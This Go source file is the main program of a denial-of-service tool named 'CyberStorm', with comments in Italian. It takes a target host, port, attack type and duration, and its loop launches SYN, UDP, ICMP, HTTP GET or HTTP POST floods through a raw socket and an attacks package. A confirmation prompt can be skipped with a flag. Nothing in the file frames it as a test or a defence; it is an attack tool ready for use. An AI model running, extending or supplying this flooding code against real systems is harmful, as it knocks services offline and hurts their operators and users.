package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"cyberstorm/attacks"
	"cyberstorm/core"
)

func main() {
	rand.Seed(time.Now().UnixNano())
	fmt.Println("CyberStorm v 0.1b b1g-d0g")
	// Stampa una frase casuale
	core.PrintRandomPhrase()

	host := flag.String("host", "", "destination IP or URL")
	port := flag.Int("port", 0, "destination port (for non-HTTP attacks)")
	attack := flag.String("attack", "syn-flood", "type of attack (syn-flood, udp-flood, icmp-flood, http-get-flood, http-post-flood)")
	body := flag.String("body", "", "Body of the POST request (only used with POST)")
	userAgent := flag.String("user-agent", "", "Custom User-Agent for HTTP requests")
	duration := flag.Int("duration", 30, "duration of the attack in seconds")
	skipConfirmation := flag.Bool("skip-confirmation", false, "Skip confirmation prompt before starting the attack") // Switch per saltare la conferma
	flag.Parse()

	if *host == "" || (*attack != "http-get-flood" && *attack != "http-post-flood" && *port == 0) {
		fmt.Println("Usage: -host <ip or URL> -port <port> -attack <syn-flood|udp-flood|icmp-flood|http-get-flood|http-post-flood> -body <data> -user-agent <user-agent> -duration <seconds>")
		os.Exit(1)
	}

	// Se non viene specificato un body per il POST, impostiamo un body predefinito
	if *body == "" && *attack == "http-post-flood" {
		*body = "param1=value1&param2=value2"
	}

	// Chiedi conferma prima di lanciare l'attacco (se lo switch -skip-confirmation non è presente)
	if !*skipConfirmation {
		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("Are you sure you want to launch the %s attack against %s:%d? (y/n): ", *attack, *host, *port)
		confirmation, _ := reader.ReadString('\n')
		confirmation = strings.TrimSpace(strings.ToLower(confirmation))

		if confirmation != "y" && confirmation != "yes" {
			fmt.Println("Attack aborted.")
			os.Exit(0)
		}
	}

	dstIp := net.ParseIP(*host)
	dstPort := uint16(*port)
	log.Printf("starting %s against %s:%d for %d seconds", *attack, *host, dstPort, *duration)

	rawSocket, err := core.NewRawSocket(dstIp)
	if err != nil {
		log.Fatalf("new raw socket: %v", err)
	}
	defer rawSocket.Close()

	wg := &sync.WaitGroup{}
	ctx, cancelFunc := context.WithCancel(context.Background())

	for i := 0; i < 2; i++ {
		wg.Add(1)
		go Run(wg, ctx, rawSocket, dstIp, dstPort, *attack, *duration, *host, *body, *userAgent)
		log.Printf("started go routine %d", i)
	}

	log.Println("press ^C to stop")

	termChan := make(chan os.Signal, 1)
	signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)
	select {
	case <-termChan:
		log.Println("received termination signal")
		cancelFunc()
		wg.Wait()
	case <-time.After(time.Duration(*duration) * time.Second):
		log.Printf("Attack finished after %d seconds\n", *duration)
		cancelFunc()
		wg.Wait()
	}

	log.Println("done")
}

func Run(wg *sync.WaitGroup, ctx context.Context, rawSocket core.RawSocket, dstIp net.IP, dstPort uint16, attack string, duration int, url, body, userAgent string) {
	defer wg.Done()
	attack = strings.ToLower(strings.TrimSpace(attack))

	for {
		select {
		case <-ctx.Done():
			log.Println("canceling attack")
			return
		default:
			var err error
			switch attack {
			case "syn-flood":
				err = attacks.SendSYN(rawSocket, dstIp, dstPort)
			case "udp-flood":
				err = attacks.SendUDP(rawSocket, dstIp, dstPort)
			case "icmp-flood":
				err = attacks.SendICMP(rawSocket, dstIp)
			case "http-get-flood":
				err = attacks.SendHTTPGet(url, userAgent)
			case "http-post-flood":
				err = attacks.SendHTTPPost(url, body, userAgent)
			default:
				log.Fatalf("unsupported attack: %s", attack)
			}

			if err != nil {
				log.Printf("send %s: %v", attack, err)
			}
		}
	}
}
